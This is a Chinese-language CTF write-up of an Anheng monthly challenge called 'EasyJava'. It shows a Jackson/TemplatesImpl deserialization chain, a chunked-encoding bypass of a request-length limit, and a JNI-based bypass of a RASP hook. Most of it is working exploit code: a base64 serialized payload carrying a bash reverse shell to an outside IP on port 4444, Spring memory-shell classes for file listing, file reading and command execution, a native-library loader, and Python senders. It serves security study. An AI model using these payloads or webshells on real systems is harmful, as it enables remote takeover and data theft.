---
layout: post
title: js测验
categories: [blog ]
tags: [Java,]
description: " 安恒月赛复现"
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: cxkjy.github.io
 
---



## EasyJava

```java
Badattribute--->jackson--->templates
```

![image-20231021124255560](..\img\final\image-20231021124255560.png)

题目中最重要的一点就是限制了长度，以前用的普通的链子长度都在2000左右，这道题直接改成了1145，所以需要我们寻找新的链子

![image-20231021124431740](..\img\final\image-20231021124431740.png)

学长让我打JNDI、JRMP的链子，但我觉得打不通没试

主办方给了一个提示

`1,bypassJava的hint：看看内部源码是怎么设置contentLength的`

```java
这很容易让人理解为，不管长度的问题，通过查看contentLength实现代码进行一个设置绕过那种
```

![image-20231021141138916](..\img\final\image-20231021141138916.png)





```java
发现一个奇怪的事件，有时候发的少的话都会返回0
```

![image-20231021150824541](..\img\final\image-20231021150824541.png)

目前的唯一思路就是想伪造一个ContentLength 溢出Integer的范围，然后return -1，但是尝试了 python发包修改、直接burp修改都不行，但如果构造脏数据也太多了（构造了 1/6就卡死了）

![image-20231021154205027](..\img\final\image-20231021154205027.png)

 ```java
在 Java 中，你无法直接修改 Integer.MAX_VALUE 的值，无论是在编译时还是在运行时。这个值是 Java 语言规范中定义的，用于表示 int 类型的最大值。因此，无论你在什么时候、以什么方式访问它，都会返回相同的值。
 ```

本来想通过反射修改Integer的值但是不成功

![image-20231021163924257](..\img\final\image-20231021163924257.png)



## 公开wp

wp分为了三部分内容

1. chunked编码绕过getContentLength
2. 绕过RASP
3. 打入内存马执行命令拿到flag

### 首先看第一部分checked编码绕过长度限制 

我自己调试的那个时已经得到了ContentLength,但是看wp发现要找的是更底层如何产生的ContentLength

说是在`org.apache.coyote.http11.Http11Processor#prepareInputFilterrs`

首先我们需要看一下代码中哪里进行了对ContentLenth的一个赋值

```java
private void prepareInputFilters(MimeHeaders headers) throws IOException {

        contentDelimitation = false;

        InputFilter[] inputFilters = inputBuffer.getFilters();

        // Parse transfer-encoding header
        // HTTP specs say an HTTP 1.1 server should accept any recognised
        // HTTP 1.x header from a 1.x client unless the specs says otherwise.
        if (!http09) {
            MessageBytes transferEncodingValueMB = headers.getValue("transfer-encoding");
            if (transferEncodingValueMB != null) {
                List<String> encodingNames = new ArrayList<>();
                if (TokenList.parseTokenList(headers.values("transfer-encoding"), encodingNames)) {
                    for (String encodingName : encodingNames) {
                        addInputFilter(inputFilters, encodingName);
                    }
                } else {
                    // Invalid transfer encoding
                    badRequest("http11processor.request.invalidTransferEncoding");
                }
            }
        }

        // Parse content-length header
        long contentLength = -1; //1111
        try {
            contentLength = request.getContentLengthLong();//这里进行赋值
        } catch (NumberFormatException e) {
            badRequest("http11processor.request.nonNumericContentLength");
        } catch (IllegalArgumentException e) {
            badRequest("http11processor.request.multipleContentLength");
        }
        if (contentLength >= 0) {
            if (contentDelimitation) {
                // contentDelimitation being true at this point indicates that
                // chunked encoding is being used but chunked encoding should
                // not be used with a content length. RFC 2616, section 4.4,
                // bullet 3 states Content-Length must be ignored in this case -
                // so remove it.
                headers.removeHeader("content-length");
                request.setContentLength(-1);//这里 
                keepAlive = false;
            } else {
                inputBuffer.addActiveFilter(inputFilters[Constants.IDENTITY_FILTER]);
                contentDelimitation = true;
            }
        }
```

```java
 request.setContentLength(-1);//这里进行了赋值，只需要把contentDelimitation的值为true就行
```

如果存在transfer-encoding这个头，然后会进去addInputFilter

![image-20231024151457822](..\img\final\image-20231024151457822.png)

如果编码方式为chunked然后，contentDelimitation就为true就满足上面的条件

```java
 if (contentDelimitation) {
                // contentDelimitation being true at this point indicates that
                // chunked encoding is being used but chunked encoding should
                // not be used with a content length. RFC 2616, section 4.4,
                // bullet 3 states Content-Length must be ignored in this case -
                // so remove it.
                headers.removeHeader("content-length");
                request.setContentLength(-1);
```

![image-20231024151632775](..\img\final\image-20231024151632775.png)

看完大概的RASP我又润回来了，

如果用上面chunked编码绕过，直接打jackson链子就会报错这个，RASP hooked forkAndExec

![image-20231106124849343](..\img\final\image-20231106124849343.png)



### 话不多说了直接上题了，出题人真的😍😍😍没话说，不像某鸟杯，0解不给wp

#### 绕过Content-Length

Transfer-Encoding:chunked  分块编码	

为了解决动态长度的问题。应运而生

数据分解程一系列数据块，并以一个或多个块发送，这样服务器可以发送数据而不需要预先知道发送内容的总大小,每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF(\r\n)，也不包括分块数据结尾的 CRLF。

```java
HTTP/1.1 200 OK
Content-Type: text/plain
Transfer-Encoding: chunked
 
3\r\n

con\r\n

8\r\n
sequence\r\n

0\r\n

\r\n
```

 ```java
import requests
import base64


url="http://101.42.224.57:8777/read"
payload = 'rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAF3QAHmNvbS5leGFtcGxlLmJ5cGFzc2phdmEubGFzdGV4cHQADGxhc3RleHAuamF2YXQABG1haW5zcgAmamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUxpc3T8DyUxteyOEAIAAUwABGxpc3RxAH4AB3hyACxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlQ29sbGVjdGlvbhlCAIDLXvceAgABTAABY3QAFkxqYXZhL3V0aWwvQ29sbGVjdGlvbjt4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAVeHNyACxjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5QT0pPTm9kZQAAAAAAAAACAgABTAAGX3ZhbHVlcQB+AAF4cgAtY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuVmFsdWVOb2RlAAAAAAAAAAECAAB4cgAwY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuQmFzZUpzb25Ob2RlAAAAAAAAAAECAAB4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4ABUwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABxMr+ur4AAAA0AB4BAAVIZWxsbwcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlDAAFAAYKAAQACAEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABBqYXZhL2xhbmcvU3RyaW5nBwAQAQAJL2Jpbi9iYXNoCAASAQACLWMIABQBACtiYXNoIC1pID4mIC9kZXYvdGNwLzEwMS40Mi4yMjQuNTcvNDQ0NCAwPiYxCAAWAQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABgAGQoACwAaAQAKU291cmNlRmlsZQEACkhlbGxvLmphdmEAIQACAAQAAAAAAAEAAQAFAAYAAQAHAAAAKwAFAAEAAAAfKrcACbgADwa9ABFZAxITU1kEEhVTWQUSF1O2ABtXsQAAAAAAAQAcAAAAAgAdcHQABUpZY3hrcHcBAHg='

length=hex(len(payload)).replace("0x","")
body=length+"\r\n"+payload+"\r\n0\r\n\r\n"
headers= {"transfer-encoding":"chunked"}
res=requests.post(url=url,data=body,headers=headers)
print(res.text)
 ```

```java
com.fasterxml.jackson.databind.JsonMappingException: RASP hooked forkAndExec (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl["outputProperties"])
```

RASP hooked forkAndExec 学了n天的RASP能看懂了

相当于把linux命令执行的出口办了，🤬完nm有waf🐕，看到这里绕过肯定是要用到JNI

![image-20231106212154097](..\img\final\image-20231106212154097.png)

出题人给的思路就是搞一个任意文件读取，读取到当前目录，进入找到RASP的那个jar包分析一下（菜狗行为），真正的佬直接JNI绕过看什么RASP

这里想的就是还是用jackson这条链子，本身就是加载的一个继承某个类然后加载这个恶意类，那么改成读取文件的不就好了（光会嘴上，现实搜了很久）

```java
public class Poc {
    public static void main(String[] args) throws IOException {
        Path path= Paths.get("X:\\cms\\aa\\successfulled\\target\\classes\\com\\example\\successfulled\\controller\\InjectControl.class");
        byte[] bytes= Files.readAllBytes(path);
        System.out.println(  Base64.getEncoder().encodeToString(bytes));
    }
}
```

先把某✌的内存马脚本拿过来（别问，问就是不想写了隔日再写）

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.http.*;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;

public class exls extends AbstractTranslet {
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    static{
        try{

            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            Method readmethod = exls.class.getMethod("ls1", HttpServletRequest.class,HttpServletResponse.class);

            RequestMappingInfo info = RequestMappingInfo.paths("/ls1").options(config).build();
            exls readfile_inject = new exls();
            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);


        }catch (Exception e){
            e.printStackTrace();
        }

    }


        public static void ls1(HttpServletRequest request,HttpServletResponse response) throws IOException {
            String rootDirectory = request.getParameter("dir"); // 替换为你的根目录路径
            listFilesAndDirectories(new File(rootDirectory),response);
            response.getWriter().flush();
        }

        public static void listFilesAndDirectories(File directory,HttpServletResponse response) throws IOException {
            File[] files = directory.listFiles();

            if (files != null) {
                for (File file : files) {
                    if (file!=null) {
                        response.getWriter().write(file.getAbsolutePath()+"\r\n");
                    }
                }
            }
        }



    }
```

读文件脚本

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.http.*;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;

public class exre extends AbstractTranslet {
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    static{
        try{

            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            Method readmethod = exre.class.getMethod("readfile2", HttpServletRequest.class,HttpServletResponse.class);

            RequestMappingInfo info = RequestMappingInfo.paths("/readfile2").options(config).build();
            exre readfile_inject = new exre();
            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);


        }catch (Exception e){
            e.printStackTrace();
        }

    }

    public void readfile2(HttpServletRequest request, HttpServletResponse response) throws IOException {

            String filePath = request.getParameter("filepath");
            if(filePath!=null){
                FileInputStream fileInputStream = new FileInputStream(filePath);
                byte[] fileBytes = new byte[fileInputStream.available()];
                fileInputStream.read(fileBytes);
                fileInputStream.close();
                String base64String = Base64.getEncoder().encodeToString(fileBytes);
                response.getWriter().write(base64String);
                response.getWriter().flush();


            }


    }
}
```

![image-20231106215327151](..\img\final\image-20231106215327151.png)

![image-20231106215719511](..\img\final\image-20231106215719511.png)

然后需要生成一个linux的so文件，就和windows中的dll文件类似

```jaava
g++ -fPIC -I"/home/kali/Desktop/新建文件夹 (8)/javajdk/jdk1.8.0_391/include" -I"/home/kali/Desktop/新建文件夹 (8)/javajdk/jdk1.8.0_391/include/linux" -shared -o libcmd.so EvilClass.c
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/Desktop/新建文件夹 (8)]
└─# ls
aaa.zip  a.zip  EvilClass.c  EvilClass.h  EvilClass.java  ez_unser  ez_unser.zip  javajdk  libcmd.so
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/Desktop/新建文件夹 (8)]
└─# base64 -w 0 libcmd.so > Evil.txt   
```

![image-20231107173415152](..\img\final\image-20231107173415152.png)

最后的EXP

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Vector;

public class EvilClass extends AbstractTranslet {

    public static native String execCmd(String cmd);
    //恶意动态链接库文件的base64编码
    private static final String EVIL_JNI_BASE64 = "";
    private static final String LIB_PATH = "/tmp/libcmd.so";

    static {
        try {
            byte[] jniBytes = Base64.getDecoder().decode(EVIL_JNI_BASE64);
            RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, "rw");
            randomAccessFile.write(jniBytes);
            randomAccessFile.close();

            //调用java.lang.ClassLoader$NativeLibrary类的load方法加载动态链接库
            ClassLoader cmdLoader = EvilClass.class.getClassLoader();
            Class<?> classLoaderClazz = Class.forName("java.lang.ClassLoader");
            Class<?> nativeLibraryClazz = Class.forName("java.lang.ClassLoader$NativeLibrary");
            Method load = nativeLibraryClazz.getDeclaredMethod("load", String.class, boolean.class);
            load.setAccessible(true);
            Field field = classLoaderClazz.getDeclaredField("nativeLibraries");
            field.setAccessible(true);
            Vector<Object> libs = (Vector<Object>) field.get(cmdLoader);
            Constructor<?> nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class);
            nativeLibraryCons.setAccessible(true);
            Object nativeLibraryObj = nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, false);
            libs.addElement(nativeLibraryObj);
            field.set(cmdLoader, libs);
            load.invoke(nativeLibraryObj, LIB_PATH, false);


            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config =
                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            Method method2 = EvilClass.class.getMethod("shell", HttpServletRequest.class, HttpServletResponse.class);
            RequestMappingInfo info = RequestMappingInfo.paths("/shell")
                    .options(config)
                    .build();
            EvilClass springControllerMemShell = new EvilClass();
            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);

        } catch (Exception hi) {
            hi.printStackTrace();
        }
    }

    public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException {

        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            String execRes = EvilClass.execCmd(cmd);
            response.getWriter().write(execRes);
            response.getWriter().flush();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

```java
import requests
import base64


url="http://101.42.224.57:8777/read"
payload = ''
length=hex(len(payload)).replace("0x","")
body=length+"\r\n"+payload+"\r\n0\r\n\r\n"
headers= {"transfer-encoding":"chunked"}
res=requests.post(url=url,data=body,headers=headers)
print(res.text)
```

然后以前这个恶意类都是javassist写的，但是这个太多了，直接读字节码

cmd中的javac可能报错，直接idea的编译即可

![image-20231107174306141](..\img\final\image-20231107174306141.png)

我***最后一关你给我整这个？之前了解个大概 (其实可以一直发忽略这个问题，但是我。。。一直报这个忍不了了)

```java
好像是因为是随机调用方法调用到 getoutput那个就对了，如果是其他就报错如下
```

![image-20231107180433881](..\img\final\image-20231107180433881.png)

## 关于java反序列化中jackson链子不稳定问题

出题人的博客中已经有了这篇文章，先自己简单分析一下

```java
com.fasterxml.jackson.databind.JsonMappingException: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl["stylesheetDOM"])
```

我们想让它调用getOutputProperties方法但是他却调用了getStylesheetDOM这个方法，然后_sdom为null直接抛异常停止运行

![image-20231107182216425](..\img\final\image-20231107182216425.png)

毫不夸张的说，🤢只知道 BadAttribute#tostring-->jackson#getter方法，但为啥能调用就没细跟，bushi)🧠告诉我说有一个getproperty类似这种方法实现的，先看调用链子

 ```java
getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
serializeAsField:689, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)
serializeFields:774, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)
serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)
defaultSerializeValue:1142, SerializerProvider (com.fasterxml.jackson.databind)
serialize:115, POJONode (com.fasterxml.jackson.databind.node)
serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
_serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
serialize:1518, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)
_writeValueAndClose:1219, ObjectWriter (com.fasterxml.jackson.databind)
writeValueAsString:1086, ObjectWriter (com.fasterxml.jackson.databind)
nodeToString:30, InternalNodeMapper (com.fasterxml.jackson.databind.node)
toString:136, BaseJsonNode (com.fasterxml.jackson.databind.node)
 ```

serializeFields:774, BeanSerializerBase 这里下断点

（可以看到这个props中存储了三个对象）在循环一次看顺序是否改变

？？？调试了十几次都是这样，莫非我的思路错了？（那就看一下props是从哪来的）

![image-20231107183105247](..\img\final\image-20231107183105247.png)

路追踪这个变量，发现其根源是在 `com.fasterxml.jackson.databind.introspect.POJOPropertiesCollector#collectAll`中调用 `_addMethods(props)` 方法来获取相关 getter 方法，之后将其添加到 `prpos` 属性中。

（后面的调不明白了，直接给结论了）

这个随机获得反射的方法，为啥一次不行次次不行呢，这是因为jackson这个 `com.fasterxml.jackson.databind.SerializerProvider#findTypedValueSerializer(java.lang.Class<?>, boolean, com.fasterxml.jackson.databind.BeanProperty)` 中获取序列化器有缓存机制，在第一次便会创建缓存，所以第一次失败后便不会再成功。

![image-20231107220137620](..\img\final\image-20231107220137620.png)

#### 根本原因

```java
所以其实就是反射 getDeclaredMethods 获取到方法的顺序是不确定的，最终导致执行相关getter方法的顺序也是不确定的，当 TemplatesImpl 的 getStylesheetDOM 方法先于 getOutputProperties 方法执行时就会导致空指针异常从而导致调用链报错中断，exp利用失败
```

### 解决随机性问题

其利用 `org.springframework.aop.framework.JdkDynamicAopProxy` 来解决jackson链子的随机性问题

动态代理 💀💀💀梦回某个杯

```java
JdkDynamicAopProxy implements AopProxy, InvocationHandler, Serializable
实现了动态代理、序列化的接口，二者同时实现危险可能很大
看它的invoke方法
```

这个target属性是构造方法传进来的，然后调用了invoke

![image-20231108100123526](..\img\final\image-20231108100123526.png)

方法也是invoke接收的

![image-20231108100439656](..\img\final\image-20231108100439656.png)

#### 这里普及一个知识点

```java
package org.example;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

public class Test {
    public static void main(String[] args) {

        Object myProxy = Proxy.newProxyInstance(TestProxy.class.getClassLoader(), new Class[]{TestInterface1.class, TestInterface2.class}, new MyHandler());
        for(Method m: myProxy.getClass().getDeclaredMethods()) {
            System.out.println(m.getName());
        }
        myProxy.hashCode();


    }
}

interface TestInterface1 {
    public void say();
}

interface TestInterface2 {
    public void test();
}

class TestProxy {

    public void eat() {
        System.out.println("eat something");
    }
    public void say() {
        System.out.println("say something");
    }
    public String getName(String a) {
        return a;
    }
}

class MyHandler implements InvocationHandler {

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        System.out.println(method);
        System.out.println("invoke dynamic proxy handler");
        return null;
    }
}
```

![image-20231108102644398](..\img\final\image-20231108102644398.png)

发现其反射获得的方法完全是根据所给的接口来的，不管被代理的类是否实现了对应的方法。动态代理中方法的实现都放在了handler中的 `invoke` 方法中了，调用其任意方法都会在 `invoke` 方法中执行，所以主要就是看所给的接口和handler就可以了。

而 `javax.xml.transform.Templates` 接口其只有 `newTransformer` 和 `getOutputProperties` 这个两个方法，让他作为我们代理所需的接口，这样最终通过 `getDeclaredMethods` 获取到的方法就只有 `newTransformer` 和 `getOutputProperties` 了，那么最终获得的getter方法便只有 `getOutputProperties` 了。

所以这里得找这样一个 handler，它的 `invoke` 方法中能的执行我们所调用的方法即可。



说人话😦就是，动态代理反射的方法从接口拿来的，而Tempaltes只有 newTransformer和getOut...方法，也就一个getter方法。

将构造好的 `templatesImpl` 这样封装一下

```java
Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
cons.setAccessible(true);
AdvisedSupport advisedSupport = new AdvisedSupport();
advisedSupport.setTarget(templatesImpl);
InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
POJONode jsonNodes = new POJONode(proxyObj);
```

![image-20231108103859648](..\img\final\image-20231108103859648.png)

并且也执行到了我们封装的方法，这样就不怕调用到其他的getter方法了

```java
package com.example.bypassjava;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import org.springframework.aop.framework.AdvisedSupport;
import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;
import java.util.Base64;

public class Poc0 {
    public static String string;

    public static void main(String[] args) throws Exception {

        ClassPool pool = ClassPool.getDefault();
//        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
//        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
//        ctClass0.removeMethod(writeReplace);
//        ctClass0.toClass();

        CtClass ctClass = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
        ctClass.addConstructor(constructor);
        byte[] bytes = ctClass.toBytecode();

        Templates templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "test");
        setFieldValue(templatesImpl, "_tfactory", null);
        //利用 JdkDynamicAopProxy 进行封装使其稳定触发
        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templatesImpl);
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
        POJONode jsonNodes = new POJONode(proxyObj);

        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(exp,jsonNodes);

        serialize(exp);
        unserialize();
//        ByteArrayOutputStream barr = new ByteArrayOutputStream();
//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
//        objectOutputStream.writeObject(exp);
//        objectOutputStream.close();
//        String res = Base64.getEncoder().encodeToString(barr.toByteArray());
//        System.out.println(res);

    }
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
    public static void serialize(Object object) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        string = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());


    }
    public static void unserialize() throws Exception {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string));
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
}
```

终于结束了，撒花完结！！！为了复现这一篇文章，要了老命了，啥ASM、javaagent、字节码、JNI全看了个七七八八。

```java
这里再说一下，本来都忘记这个是啥了，看了✌们的一篇周报，死去的记忆回来了，大概就是如果有这个writeReplace序列化的时候就会执行然后会break退出，不会执行我们的反序列化，当时复现阿里ctf那道题接触过（直接把源码中的这个方法删了）所以这里我进行了注释。
//        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
//        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
//        ctClass0.removeMethod(writeReplace);
//        ctClass0.toClass();
```





### 糟糕还忘记了一个最关键的地方

猜一下出题人的hook咋写的，声明premain方法，修改字节码，然后classreader#accept遍历方法

通过方法判断如果是UnixProcess#forkAndExec方法就hook掉

![image-20231108112934293](..\img\final\image-20231108112934293.png)

`NativeLibrary类的load`

